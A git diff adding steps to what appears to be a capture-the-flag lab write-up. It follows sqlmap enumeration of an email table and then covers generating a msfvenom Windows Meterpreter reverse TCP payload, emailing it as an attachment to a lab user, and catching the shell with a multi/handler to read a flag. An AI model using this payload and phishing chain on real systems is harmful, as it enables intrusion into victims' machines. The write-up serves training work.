@@ -166,3 +166,66 @@ vulnerability is suspected. In this case, it's pointing to the
 - --data "action=rk_action&fdata=rk_email%3Dtest%2540yahoo.com%26rk_subject%3Dtest%26rk_comment%3D%26submit%3D&msg=": This option is used to provide the data that will be sent to the web application as part of the request. It seems to be simulating a form submission with various parameters. The %3D and %2540 are URLencoded representations of '=' and '@', respectively.
 - --tables: This option instructs sqlmap to enumerate the database tables once the SQL injection vulnerability is
 -  identified. It attempts to gather information about the database structure.
+
+![flag 5](https://github.com/Mays-M/Images-/blob/main/flag5.png)
+
+6. Also, the command shows there is a database called ‘challenger’ and contains a table called to inta_ch06 which is a list of emails
+
+![flag 5](https://github.com/Mays-M/Images-/blob/main/flag5.png)
+
+7. Navigate mail.lookout.vle.fi and create account(email used : jeff01ab0168@lookout.vle.fi) then send email to jeff01+studentid@challenger.vle.fi
+
+![flag 5](https://github.com/Mays-M/Images-/blob/main/flag5.png)
+
+8. Seems we need to send an executable file. So
+9. create malicious file with msfvenom (combo of msfplayload and msfencod)
+- environments :kali sent executable payload to
+window
+- Demo: Generate a 64-bit Windows Meterpreter reverse TCP payload and save it as payload.exe in the
+current working directory. The Kali’s IP address (LHOST) and port (LPORT) with the appropriate
+values for your scenario.
+
+msfvenom -p windows/x64/meterpreter/reverse_tcp --
+platform windows LHOST=198.18.103.134 LPORT=5433 -f
+exe -o payload.exe
+
+![flag 5](https://github.com/Mays-M/Images-/blob/main/flag5.png)
+
+![flag 5](https://github.com/Mays-M/Images-/blob/main/flag5.png)
+
+10. The file Payload.exe is created on the kali’s machine to be delivered by email to jeff’s machine ass attachment and when the user will execute the file and because defender is disable to detect when downloading.
+
+![flag 5](https://github.com/Mays-M/Images-/blob/main/flag5.png)
+
+11. Now on the handler:
+
+
+Msfconsole
+Use multi/handler
+Set payload
+windows/x64/meterpreter/rev
+erse_tcp
+Show options
+Set lport 5433
+Set lhost 198.18.103.134
+
+
+
+![flag 5](https://github.com/Mays-M/Images-/blob/main/flag5.png)
+
+12. Run (at this point you should send the email to jeff) and what to listen. At this point when jeff’s machine execute the file will be able to connect by meterpreter, we can list files on the machine.
+
+![flag 5](https://github.com/Mays-M/Images-/blob/main/flag5.png)
+
+13. Enter the shell
+
+![flag 5](https://github.com/Mays-M/Images-/blob/main/flag5.png)
+
+14. Flag successfully found inside text file called flag on jeff’s desktop after
+directed to desktop path and typed, thendecoded the content.
+flag{HlXN50rE4VbPLJD}
+
+
+![flag 5](https://github.com/Mays-M/Images-/blob/main/flag5.png)
+
+![flag 5](https://github.com/Mays-M/Images-/blob/main/flag5.png)
